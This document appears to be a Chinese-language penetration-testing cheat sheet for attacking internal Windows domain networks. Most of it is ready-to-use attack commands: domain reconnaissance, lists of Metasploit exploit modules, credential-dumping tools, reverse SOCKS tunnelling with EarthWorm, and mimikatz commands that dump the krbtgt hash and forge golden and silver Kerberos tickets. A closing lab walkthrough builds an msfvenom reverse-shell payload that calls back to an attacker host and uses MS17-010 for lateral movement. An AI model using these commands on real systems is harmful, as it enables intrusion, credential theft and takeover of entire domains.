# Hack_For_Intranet
 
 0x01. 信息收集
 ----
#### 1.常见信息收集命令


#ipconfig:
```
ipconfig /all ------> 查询本机 IP 段，所在域等
```
#net:
```
net user ------> 本机用户列表
net localgroup administrators ------> 本机管理员[通常含有域用户]
net user /domain ------> 查询域用户
net group /domain ------> 查询域里面的工作组
net group "domain admins" /domain ------> 查询域管理员用户组
net localgroup administrators /domain ------> 登录本机的域管理员
net localgroup administrators workgroup\user001 /add ----->域用户添加到本机 net group "Domain controllers" -------> 查看域控制器(如果有多台)
net view ------> 查询同一域内机器列表 net view /domain ------> 查询域列表
net view /domain:domainname
```
#dsquery
```
dsquery computer domainroot -limit 65535 && net group "domain
computers" /domain ------> 列出该域内所有机器名
dsquery user domainroot -limit 65535 && net user /domain------>列出该域内所有用户名
dsquery subnet ------>列出该域内网段划分
dsquery group && net group /domain ------>列出该域内分组 
dsquery ou ------>列出该域内组织单位 
dsquery server && net time /domain------>列出该域内域控制器 
```
#### 2.第三方信息收集

```
    NETBIOS 信息收集
    SMB 信息收集
    空会话信息收集
    漏洞信息收集等
```
#### 3.内网主动扫描相关

```
1.nmap 等工具扫描

2.msf自带模块扫描

MSF内网渗透 扫描模块

端口扫描

auxiliary/scanner/portscan
scanner/portscan/ack        ACK防火墙扫描
scanner/portscan/ftpbounce  FTP跳端口扫描
scanner/portscan/syn        SYN端口扫描
scanner/portscan/tcp        TCP端口扫描
scanner/portscan/xmas       TCP"XMas"端口扫描

SMB扫描

smb枚举auxiliary/scanner/smb/smb_enumusers
返回DCERPC信息auxiliary/scanner/smb/pipe_dcerpc_auditor
扫描SMB2协议auxiliary/scanner/smb/smb2
扫描smb共享文件auxiliary/scanner/smb/smb_enumshares
枚举系统上的用户auxiliary/scanner/smb/smb_enumusers
SMB登录auxiliary/scanner/smb/smb_login
SMB登录use windows/smb/psexec(通过md5值登录)
扫描组的用户auxiliary/scanner/smb/smb_lookupsid
扫描系统版本auxiliary/scanner/smb/smb_version

mssql扫描(端口tcp1433udp1434)

admin/mssql/mssql_enum     MSSQL枚举
admin/mssql/mssql_exec     MSSQL执行命令
admin/mssql/mssql_sql      MSSQL查询
scanner/mssql/mssql_login  MSSQL登陆工具
scanner/mssql/mssql_ping   测试MSSQL的存在和信息

另外还有一个mssql_payload的模块 利用使用的

smtp扫描

smtp枚举auxiliary/scanner/smtp/smtp_enum
扫描smtp版本auxiliary/scanner/smtp/smtp_version

snmp扫描

通过snmp扫描设备auxiliary/scanner/snmp/community

ssh扫描

ssh登录auxiliary/scanner/ssh/ssh_login
ssh公共密钥认证登录auxiliary/scanner/ssh/ssh_login_pubkey
扫描ssh版本测试auxiliary/scanner/ssh/ssh_version

telnet扫描

telnet登录auxiliary/scanner/telnet/telnet_login
扫描telnet版本auxiliary/scanner/telnet/telnet_version

tftp扫描

扫描tftp的文件auxiliary/scanner/tftp/tftpbrute

ftp版本扫描scanner/ftp/anonymous
ARP扫描

auxiliary/scanner/discovery/arp_sweep

扫描UDP服务的主机auxiliary/scanner/discovery/udp_probe
检测常用的UDP服务auxiliary/scanner/discovery/udp_sweep
sniffer密码auxiliary/sniffer/psnuffle
snmp扫描scanner/snmp/community
vnc扫描无认证扫描scanner/vnc/vnc_none_auth

3.Cobalt Strike扫描 
    本身支持的arp icmp等协议扫描
    各种丰富的第三方插件（注意安全）根据需求各取所需，比如Ladon，taowu等等。。。。。。

3.脚本扫描
  ps，py,ruby,php，Java，asp等等各种支持当前环境的扫描脚本
```

#### 4.常见端口与服务

```
| 端口号 | 端口说明 | 攻击技巧 |
|--------|--------|--------|
|21/22/69 |ftp/tftp：文件传输协议 |爆破\嗅探\溢出\后门|
|22 |ssh：远程连接 |爆破OpenSSH；28个退格|
|23 |telnet：远程连接 |爆破\嗅探|
|25 |smtp：邮件服务 |邮件伪造|
|53	|DNS：域名系统 |DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙|
|67/68 |dhcp |劫持\欺骗|
|110 |pop3 |爆破|
|139 |samba |爆破\未授权访问\远程代码执行|
|143 |imap |爆破|
|161 |snmp |爆破|
|389 |ldap |注入攻击\未授权访问|
|445 |SMB |远程代码执行|
|512/513/514 |linux r|直接使用rlogin|
|873 |rsync |未授权访问|
|1080 |socket |爆破：进行内网渗透|
|1352 |lotus |爆破：弱口令\信息泄漏：源代码|
|1433 |mssql |爆破：使用系统用户登录\注入攻击|
|1521 |oracle |爆破：TNS\注入攻击|
|2049 |nfs |配置不当|
|2181 |zookeeper |未授权访问|
|3306 |mysql |爆破\拒绝服务\注入|
|3389 |rdp |爆破\Shift后门|
|4848 |glassfish |爆破：控制台弱口令\认证绕过|
|5000 |sybase/DB2 |爆破\注入|
|5432 |postgresql |缓冲区溢出\注入攻击\爆破：弱口令|
|5632 |pcanywhere |拒绝服务\代码执行|
|5900 |vnc |爆破：弱口令\认证绕过|
|6379 |redis |未授权访问\爆破：弱口令|
|7001 |weblogic |Java反序列化\控制台弱口令\控制台部署webshell|
|80/443/8080 |web |常见web攻击\控制台爆破\对应服务器版本漏洞|
|8069 |zabbix |远程命令执行|
|9080 |websphere |远程命令执行
|9090 |websphere控制台 |爆破：控制台弱口令\Java反序列|
|9200/9300 |elasticsearch |远程代码执行|
|11211 |memcacache |未授权访问|
|27017 |mongodb |爆破\未授权访问|
```
#### 5.内网拓扑架构分析
```
    DMZ
    管理网
    生产网
    测试网
 ```
 
 #### 6.主机信息收集
 ```
1、用户列表

windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户
2、进程列表

析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等
3、服务列表

与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限/漏洞]
4、端口列表

开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集
5、补丁列表

分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞
6、本机共享

本机共享列表/访问权限 本机访问的域共享/访问权限
7、本用户习惯分析

历史记录 收藏夹 文档等
8、获取当前用户密码工具
Windows

    mimikatz
    wce
    Invoke-WCMDump
    mimiDbg
    LaZagne
    nirsoft_package
    QuarksPwDump fgdump
    星号查看器等

Linux

    LaZagne
    mimipenguin

 ```
        
0x02. 常用工具与代理相关
----
#### 1.代理分类
```
代理服务器(ProxyServer)是网络信息的中转站，它接收客户端的访问请求，并以自己的身份转发此请求。对于接收信息的一方而占，就像代理服务器向它提出请求一样，从而保护了客户端，增加了反向追踪的难度。

根据代理服务的功能划分，代理服务器可以分为:http代理服务器、sock5代理服务器、VPN代理服务器等。

http代理：
    http代理服器是一种最常见的代理服务器，它的优点是响应速度快、延迟相对较低及数量众多，如：Reduh、Tunna、reGeorg、Weevely、ABPTTS，通常不费吹灰之力就町以找到一个不错的http代理服务器。不过，它的缺点也比较明显，仅能响应http通信协议，并滤除80、8080等Web常用端口外的其他端口访问请求
    举例：reGeorg,下载地址：https://github.com/sensepost/reGeorg，将reGeorg,上传到服务端。直接访问上传的reGeorg文件,提示“Georg says, 'All seems fine'”,则为正常，然后用在客户端使用命令行，运行py程序：python reGeorgSocksProxy.py -p 8080 -u http: //www.XXX.com/tunnel.jsp，接下来只要使用Socks5的工具,将代理指向127.0.0.1:8080,就可以了

Socks代理服务器：
    Sock5代理服务器最常用。它对访问协议、访问端口方面均没有限制，可以转发各种协议的通信请求。常见工具：Frp，Earthworm， Ssocks，msf做socks代理，CobaltStrike做socks4a代理
    
    EW（EarthWorm）使用：
    正向 SOCKS v5 服务器:
    ./ew -s ssocksd -l 1080
    
    反弹 SOCKS v5 服务器:
    a) 先在一台具有公网 ip 的主机A上运行以下命令：
    $ ./ew -s rcsocks -l 1080 -e 8888 
    b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口
    $ ./ew -s rssocks -d 1.1.1.1 -e 8888 
    
    多级级联
    $ ./ew -s lcx_listen -l 1080 -e 8888
    $ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
    $ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
    
    lcx_tran 的用法
    $ ./ew -s ssocksd -l 9999
    $ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
    
    lcx_listen、lcx_slave 的用法
    $ ./ew -s lcx_listen -l 1080 -e 8888
    $ ./ew -s ssocksd -l 9999
    $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999

    “三级级联”的本地SOCKS测试用例以供参考
    $ ./ew -s rcsocks -l 1080 -e 8888
    $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
    $ ./ew -s lcx_listen -l 9999 -e 7777
    $ ./ew -s rssocks -d 127.0.0.1 -e 7777
    
VPN代理服务器
    常见vpn 协议：PPTP，L2TP，IPSec，SSLVPN，OpenVPN，搭建工具推荐：https://github.com/hwdsl2/setup-ipsec-vpn，https://github.com/SoftEtherVPN/SoftEtherVPN
```

#### 2.METASPLOIT简单使用


msf简单使用:
1.https://www.freebuf.com/news/210292.html
2.https://www.jianshu.com/p/1adbabecdcbd
#### 3.Cobalt Strike简单使用 

cs简单使用：
1.https://www.freebuf.com/company-information/167460.html
2.https://www.jianshu.com/p/8d823adbc6b5

0x03. 非域渗透
----
#### 
```
端口扫描

    1.端口的指纹信息（版本信息）
    2.端口所对应运行的服务
    3.常见的默认端口号
    4.尝试弱口令

端口爆破

hydra
端口弱口令

    NTScan
    Hscan
    自写脚本

端口溢出

smb

    ms08067
    ms17010
    ms11058
    ...

apache ftp ...
常见的默认端口
1、web类(web漏洞/敏感目录)

第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix ...

80 web 
80-89 web 
8000-9090 web 

2、数据库类(扫描弱口令)

1433 MSSQL 
1521 Oracle 
3306 MySQL 
5432 PostgreSQL 
50000 DB2

3、特殊服务类(未授权/命令执行类/漏洞)

443 SSL心脏滴血 
445 ms08067/ms11058/ms17010等 
873 Rsync未授权 
5984 CouchDB http://xxx:5984/_utils/ 
6379 redis未授权 
7001,7002 WebLogic默认弱口令，反序列 
9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 
11211 memcache未授权访问 
27017,27018 Mongodb未授权访问 
50000 SAP命令执行 
50070,50030 hadoop默认端口未授权访问 

4、常用端口类(扫描弱口令/端口爆破)

21 ftp 
22 SSH 
23 Telnet 
445 SMB弱口令扫描 
2601,2604 zebra路由，默认密码zebra 
3389 远程桌面 

```

0x04. 域渗透
----
#### 1.域信息收集
```
常用收集域信息命令

ipconfig /all ------ 查询本机IP段，所在域等
net user ------ 本机用户列表
net localhroup administrators ------ 本机管理员[通常含有域用户]
net user /domain ------ 查询域用户
net group /domain ------ 查询域里面的工作组
net group “domain admins” /domain ------ 查询域管理员用户组
net localgroup administrators /domain ------ 登录本机的域管理员
net localgroup administrators workgroup\user001 /add ------域用户添加到本机
net group “domain controllers” /domain ------ 查看域控制器(如果有多台)
net time /domain ------ 判断主域，主域服务器都做时间服务器
net config workstation ------ 当前登录域
net session ------ 查看当前会话
net use \ip\ipc$ pawword /user:username ------ 建立IPC会话[空连接-***]
net share ------ 查看SMB指向的路径[即共享]
net view ------ 查询同一域内机器列表
net view \ip ------ 查询某IP共享
net view /domain ------ 查询域列表
net view /domain:domainname ------ 查看workgroup域中计算机列表
net start ------ 查看当前运行的服务
net accounts ------ 查看本地密码策略
net accounts /domain ------ 查看域密码策略
nbtstat –A ip ------netbios 查询
netstat –an/ano/anb ------ 网络连接查询
route print ------ 路由表

dsquery computer ----- finds computers in the directory.
dsquery contact ----- finds contacts in thedirectory.
dsquery subnet ----- finds subnets in thedirectory.
dsquery group ----- finds groups in thedirectory.
dsquery ou ----- finds organizationalunits in the directory.
dsquery site ----- finds sites in thedirectory.
dsquery server ----- finds domain controllers inthe directory.
dsquery user ----- finds users in thedirectory.
dsquery quota ----- finds quota specificationsin the directory.
dsquery partition ----- finds partitions in thedirectory.
dsquery * ----- finds any object inthe directory by using a generic LDAP query.
dsquery server –domain Yahoo.com | dsget server–dnsname –site —搜索域内域控制器的DNS主机名和站点名
dsquery computer domainroot –name -xp –limit 10----- 搜索域内以-xp结尾的机器10台
dsquery user domainroot –name admin -limit ---- 搜索域内以admin开头的用户10个

tasklist /V ----- 查看进程[显示对应用户]
tasklist /S ip /U domain\username /P /V ----- 查看远程计算机进程列表
qprocess * ----- 类似tasklist
qprocess /SERVER:IP ----- 远程查看计算机进程列表
nslookup –qt-MX Yahoo.com ----- 查看邮件服务器
whoami /all ----- 查询当前用户权限等
set ----- 查看系统环境变量
systeminfo ----- 查看系统信息
qwinsta ----- 查看登录情况
qwinsta /SERVER:IP ----- 查看远程登录情况
fsutil fsinfo drives ----- 查看所有盘符
gpupdate /force ----- 更新域策略

wmic bios ----- 查看bios信息
wmic qfe ----- 查看补丁信息
wmic qfe get hotfixid ----- 查看补丁-Patch号
wmic startup ----- 查看启动项
wmic service ----- 查看服务
wmic os ----- 查看OS信息
wmic process get caption,executablepath,commandline
wmic process call create “process_name” (executes a program)
wmic process where name=”process_name” call terminate (terminates program)
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size,
volumeserialnumber (hard drive information)
wmic useraccount (usernames, sid, and various security related goodies)
wmic useraccount get /ALL
wmic share get /ALL (you can use ? for gets help ! )
wmic startup list full (this can be a huge list!!!)
wmic /node:“hostname” bios get serialnumber (this can be great for finding warranty info about target)

```
#### 2.常规渗透思路
```
    通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网
    在域渗透过程如果发现域管理员的密码已经修改，可尝试利用krbtgt用户的历史hash来进行票据传递攻击，krbtgt用户的密码一般不会有人去修改
    域渗透过程中可能会使用到MS14-068这个漏洞，利用该漏洞可以将任何一个域用户提权至域管理员权限
``` 

   #### GoldenTicket
```    
    Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限
    制作金票的条件：
    1、域名称
    2、域的SID值
    3、域的KRBTGT账户密码HASH
    4、伪造用户名，可以是任意的
    利用过程
    金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的lsadump::dcsync /test.test.org /user:krbtgt 命令获取krbtgt的值
    
    得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT
    mimikatz中：
    kerberos::golden /admin:administrator /domain:test.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:{KRBTGT HASH} /ticket:golden.kiribi
     /admin：伪造的用户名
     /domain：域名称
     /sid：SID值，注意是去掉最后一个-后面的值
     /krbtgt：krbtgt的HASH值
     /ticket：生成的票据名称
     
   通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。
    kerberos::purge
    kerberos::ptt golden.kiribi
    kerberos::list
    
    此时就可以通过dir成功访问域控的共享文件夹。
    dir \\OWA.test.org\c$

```
#### SilverTickets
```
    Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。
    
    黄金票据和白银票据的一些区别： Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限 银票：伪造TGS，只能访问指定的服务 加密方式不同： Golden Ticket由krbtgt的hash加密 Silver Ticket由服务账号（通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信
    
    制作银票的条件：
    1.域名称
    2.域的SID值
    3.域的服务账户的密码HASH（不是krbtgt，是域控）
    4.伪造的用户名，可以是任意用户名，这里是silver_test
    
    需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值
    mimikatz生成银票
    kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA.test.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt
    参数说明：
    /domain：当前域名称
    /sid：SID值，和金票一样取前面一部分
    /target：目标主机，这里是OWA.TEST.ORG
    /service：服务名称，这里需要访问共享文件，所以是cifs
    /rc4：目标主机的HASH值
    /user：伪造的用户名
    /ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
    这时通过klist查看当前会话的kerberos票据可以看到生成的票据
    
    dir \\OWA.test.org\c$访问DC的共享文件夹
 ```   
#### EnhancedGolden Tickets
```
    在Golden Ticket部分说明可利用krbtgt的密码HASH值生成金票，从而能够获取域控权限同时能够访问域内其他主机的任何服务。但是普通的金票不能够跨域使用，也就是说金票的权限被限制在当前域内
    域树与域林
    
    TEST.ORG为根域,TEST1.TEST.ORG和 TEST2.TEST.ORG 均为 TEST.ORG的子域，这三个域组成了一个域树。子域的概念可以理解为一个集团在不同业务上分公司，他们有业务重合的点并且都属于 TEST1.ORG这个根域，但又独立运作。同样 TEST1.COM 也是一个单独的域树，两个域树 TEST.ORG 和 TEST1.ORG 组合起来被称为一个域林。

   普通金票的局限性

   TEST.ORG为其他两个域（TEST1.TEST.ORG和TEST2.TEST.ORG）的根域，根域和其他域的最大的区别就是根域对整个域林都有控制权。而域正是根据Enterprise Admins组来实现这样的权限划分。

   Enterprise Admins组
   EnterpriseAdmins组是域中用户的一个组，只存在于一个林中的根域中，这个组的成员，这里也就是TEST.ORG中的Administrator用户（不是本地的Administrator，是域中的Administrator）对域有完全管理控制权。

   Domain Admins组
   子域中是不存在EnterpriseAdmins组的，在一个子域中权限最高的组就是Domain Admins组。TEST.TEST.ORG这个子域中的Administrator用户，这个Administrator有当前域的最高权限
   
   知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据,然后通过mimikatz重新生成包含根域SID的新的金票
   
   此时的这个票据票是拥有整个域林的控制权的
```

0x05. 后门
----

0x06. 免杀相关
----
#### 1.常见反病毒软件查杀方式：
```
    1.基于特征
    2.基于行为

二．shellcode 免杀总结
   shellcode"分离"免杀 
   shellcode"混淆"免杀
   白名单加载shellcode

```    








0x07. 案例分析
----
#### 1.红日的第一套靶场个人通过指南



```
1.网络结构
    靶机1 双网卡（内网：192.168.52.143，外网：192.168.101.80） 
    靶机2 内192.168.52.141
    靶机3 内192.168.52.138
    靶机2，3不出网且138域控，本地网段为192.168.101.0/24

2.题目2个入口phpmyadmin弱口令通过修改日志getshell；yxcms弱口令后台getshell。
3.使用msf生成后门上传至服务器并执行：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.101.66 LPORT=1234 -f exe > shell.exe
  设置监听：
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set lhost 192.168.101.66
  set lport 1234
  run
  ```
  ![image](https://github.com/JohnnyZhouX/Hack_For_Intranet/blob/main/pic/%E6%8D%95%E8%8E%B72.PNG)
  
  ```
  
  添加路由：
  查看路由 
  meterpreter > run get_local_subnets
  可以获悉内网网段地址为：192.168.52.0/24
  添加目标网段路由
  meterpreter > run autoroute -s 192.168.52.0/24
  查看路由
  run autoroute -p
  ```
   ![image](https://github.com/JohnnyZhouX/Hack_For_Intranet/blob/main/pic/%E6%8D%95%E8%8E%B71.PNG)
 ```  
  
  ms17010 扫描
  use auxiliary/scanner/smb/smb_ms17_010 
  show options
  set rhosts 192.168.52.0/24
  set threads 20
  run
  ```
   ![image](https://github.com/JohnnyZhouX/Hack_For_Intranet/blob/main/pic/%E6%8D%95%E8%8E%B73.PNG)
  ```
  
  
  使用exp横向渗透192.168.101.138的主机：
  msf exploit(handler) > use exploit/windows/smb/ms17_010_psexec  
  msf exploit(ms17_010_psexec) > set payload windows/meterpreter/bind_tcp (目标不出网，设置正向shell)
  msf exploit(ms17_010_psexec) > set rhost 192.168.101.138
  msf exploit(ms17_010_psexec) > exploit
  
  ```
   ![image](https://github.com/JohnnyZhouX/Hack_For_Intranet/blob/main/pic/%E6%8D%95%E8%8E%B74.PNG)
  ```

```    
